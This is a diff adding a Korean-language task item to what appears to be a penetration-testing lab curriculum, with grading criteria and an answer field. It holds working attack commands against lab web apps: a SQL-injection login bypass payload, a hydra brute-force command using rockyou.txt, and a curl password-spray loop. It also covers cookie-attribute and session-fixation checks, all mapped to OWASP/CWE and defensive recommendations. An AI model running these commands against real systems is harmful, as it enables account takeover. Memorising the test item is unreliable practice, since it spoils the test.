@@ -616,3 +616,70 @@ steps:
 
     '
   script: ''
+- order: 100
+  instruction: '[Multi-task] 인증/세션 (deep) 5단계 통합 — SQLi 인증 → hydra → curl 수동 → 쿠키 속성 → 세션 고정.'
+  bastion_prompt: |
+    인증/세션 deep dive 5 단계를 한 흐름의 평가로 수행해줘. W06 의 기본과 비교.
+
+    1) [SQLi 인증 우회 + JWT 분석] curl -s -X POST {{WEB_IP}}:3000/rest/user/login -H 'Content-Type:
+       application/json' -d '{"email":"admin@juice-sh.op'"'"'-- ","password":"x"}' 의 응답에서 token 추출 →
+       echo TOKEN | cut -d. -f2 | base64 -d | python3 -m json.tool 의 payload 분석. role / exp / iat / sub
+       claim 정리. OWASP A07 + CWE-89 매핑.
+
+    2) [hydra DVWA 브루트포스] hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V {{WEB_IP}} http-post-form
+       "/login.php:username=^USER^&password=^PASS^:Login failed" 의 명령 + 옵션 설명 (-t threads / -f stop on
+       success / -V verbose / -f form failure string). 실 호출은 syntax 만 (fail2ban 위험). MITRE T1110.001 매핑.
+
+    3) [curl 수동 브루트포스] for pw in admin admin123 password Welcome1 Pass@2024 P@ssw0rd Summer2024 letmein; do
+       curl -s -c /tmp/c.txt -X POST {{WEB_IP}}:8080/login.php -d "username=admin&password=$pw&Login=Login"
+       -o /dev/null -w "$pw: %{http_code}\n"; done 의 8 후보 + 응답 코드 추적. 302 (redirect to /index.php) →
+       성공 / 200 (login.php 재표시) → 실패 의 의미. MITRE T1110.003 매핑.
+
+    4) [세션 쿠키 보안 속성] curl -sI -X POST {{WEB_IP}}:8080/login.php -d "username=admin&password=password&Login=Login"
+       의 Set-Cookie 응답에서 HttpOnly / Secure / SameSite / Path / Domain / Max-Age 6 속성 표 작성. 누락
+       속성 의 위험 (XSS document.cookie / MITM / CSRF) 정리. CWE-1004 (HttpOnly) + CWE-614 (Secure) 매핑.
+
+    5) [Session Fixation 검증] curl -s -c /tmp/c1.txt {{WEB_IP}}:8080/login.php 의 pre-login PHPSESSID +
+       curl -s -b /tmp/c1.txt -c /tmp/c2.txt -X POST {{WEB_IP}}:8080/login.php -d "username=admin&password=password
+       &Login=Login" 의 post-login PHPSESSID. 같으면 Session Fixation 가능 (attacker 가 victim 에게 session ID
+       을 사전 fix 후 victim 의 로그인 후 자신 session 사용). diff /tmp/c1.txt /tmp/c2.txt. CWE-384 매핑.
+
+    마지막에 5단계 × (인증/세션 표면 / 페이로드 / 발견 finding / 위험도 / OWASP/CWE / 방어 권고 (account lockout /
+    JWT alg whitelist / cookie 6 속성 / session rotation / MFA)) 의 5×6 매트릭스 + H1 disclosure 5 finding +
+    인증/세션 6 layer 권고 (1. account lockout 5회 / 15분 2. fail2ban 또는 wallarm rate limit 3. JWT secure
+    secret 32+ byte + alg whitelist 4. cookie 6 속성 강제 5. session rotation on auth + privilege change 6. MFA
+    TOTP / WebAuthn) 출력.
+  hint: 인증/세션 deep dive 5 단계. W06 의 후속 — JWT alg + DVWA hydra + Session Fixation 검증.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] 인증/세션 deep 5단계 — SQLi+JWT/hydra/curl spray/cookie 6속성/Session Fix. OWASP A07 + CWE-89/384/614/1004 매핑 + 5×6 매트릭스 + 6 layer 권고.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - JWT payload 분석 (role/exp/iat/sub)
+      - hydra + curl spray 둘 다 시도
+      - cookie 4 속성 이상 (HttpOnly/Secure/SameSite/Path)
+      - Session Fixation 검증 (diff pre/post-login)
+      - 5×6 매트릭스 + 6 layer 권고
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - curl + hydra + diff 표준
+      - 자동화 + manual 비교
+      - cookie 6 속성 검증
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - hydra syntax 오류
+      - cookie 속성 3개 이하
+      - Session Fixation 검증 누락
+      - 매트릭스 6 컬럼 미만
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. 인증/세션 deep 5 + 5×6 매트릭스 + 6 layer 권고.
+  answer_detail: |
+    IAM Engineer 페르소나 — 인증/세션 deep dive 5 단계 (W06 의 후속). JWT + DVWA + Session Fixation 검증.
+  script: ''
